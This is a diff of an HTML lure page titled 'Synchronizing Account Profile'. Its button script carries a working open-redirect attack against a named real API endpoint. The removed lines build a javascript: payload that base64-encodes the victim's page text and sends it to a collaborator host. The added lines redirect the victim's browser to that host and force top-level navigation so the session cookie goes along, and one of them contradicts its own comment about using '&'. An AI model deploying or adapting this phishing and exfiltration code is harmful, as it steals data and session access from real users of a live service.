@@ -2,40 +2,34 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Synchronize Session Profile</title>
+    <title>Synchronizing Account Profile</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #fafafa; }
-        .box { display: inline-block; padding: 40px; background: white; border: 1px solid #e0e0e0; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-        .btn { background: #007bff; color: white; padding: 14px 28px; font-size: 16px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; font-weight: bold; }
-        .btn:hover { background: #0056b3; }
+        .box { display: inline-block; padding: 40px; background: white; border: 1px solid #e0e0e0; border-radius: 8px; }
+        .btn { background: #007bff; color: white; padding: 14px 28px; font-size: 16px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>Account Synchronisation Required</h2>
-    <p>Click the action button below to refresh your tokens securely.</p>
+    <h2>Account Synchronisation</h2>
+    <p>Click below to authorize token refresh.</p>
     <br>
     <button id="exploitBtn" class="btn">Synchronize Session Now</button>
 </div>
 
 <script>
     document.getElementById('exploitBtn').addEventListener('click', () => {
-        // 1. Establish your active exfiltration receiver endpoint
-        const collaboratorUrl = "https://8eny97xr31sk7hlo5v5et2smddj57xvm.k.e-secureapp.com";
+        // 1. Your Burp Collaborator URL
+        const collaboratorUrl = "https://a2d0x9ltr3gmvj9qtxtgh4go1f77v0jp.k.e-secureapp.com";
 
-        // 2. Build the precise 'javascript:' execution payload (No 'web' prefix)
-        // It grabs the target's DOM text, base64 encodes it, and pushes the window out to your listener
-        const jsPayload = "javascript:void(window.location='" + collaboratorUrl + "'+btoa(unescape(encodeURIComponent(document.body.innerText))))";
+        // 2. The Target API endpoint. 
+        // FIX 1: We use '&' to safely chain parameters.
+        // FIX 2: We pass your Collaborator URL directly as a standard HTTPS destination.
+        // If the open redirect works, the server will redirect the user's browser directly to your Collaborator.
+        const finalizedTarget = "https://ocean.medishout.co.uk/v1/users/me/?platform=web" + encodeURIComponent(collaboratorUrl);
 
-        // 3. Define the main target endpoint URL
-        const baseTargetUrl = "https://ocean.medishout.co.uk/v1/users/me/?platform=web";
-
-        // 4. Map the payload to the parameter handling your open redirect loop.
-        // Change 'redirect' below if the application uses a different token like 'next', 'url', or 'callback'
-        const finalizedTarget = baseTargetUrl + "?redirect=" + encodeURIComponent(jsPayload);
-
-        // 5. Fire a user-initiated top-level GET navigation to cleanly attach the SameSite=Lax cookie
+        // 3. Force top-level navigation so SameSite=Lax cookie passes cleanly
         window.location.href = finalizedTarget;
     });
 </script>
